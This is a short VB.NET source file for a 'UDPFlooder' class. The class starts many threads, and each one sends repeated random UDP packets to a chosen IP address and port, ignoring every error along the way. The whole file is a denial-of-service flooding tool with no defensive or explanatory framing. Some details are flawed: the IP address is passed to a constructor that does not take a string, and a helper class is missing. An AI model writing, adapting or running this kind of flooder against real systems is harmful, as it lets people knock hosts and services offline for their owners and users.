Imports System.Net
Imports System.Net.Sockets
Imports System.IO, System.Text
Imports System.Threading
Public Class UDPFlooder
    Dim IDManager As New IDManager
    Private Structure Settings
        Dim IP As String
        Dim Requests, Port As Integer
    End Structure
    Dim S As New Settings
    Dim ThreadList As List(Of Thread)
    Public Sub Setup(IP As String, Port As Integer, Requests As Integer, Threads As Integer)
        ThreadList = New List(Of Thread)
        With S
            .IP = IP
            .Requests = Requests
            .Port = Port
        End With
        For x As Integer = 0 To Threads
            ThreadList.Add(New Thread(AddressOf Start))
            ThreadList(x).Start()
        Next
    End Sub
    Private Sub Start()
        Dim IPEndPoit As New IPEndPoint(New IPAddress(S.IP), S.Port)
        Dim UdpClient As New UdpClient
        Dim byteMessage() As Byte = Encoding.ASCII.GetBytes(IDManager.GetRandomID(10))
        'Connect
        Try
            UdpClient.Connect(IPEndPoit)
        Catch ex As Exception
        End Try

        Dim current As Integer = 0
        While (current <= S.Requests)
            current = current + 1 '++

            Try
                UdpClient.Send(byteMessage, byteMessage.Length)
            Catch ex As Exception
            End Try

        End While
    End Sub
End Class
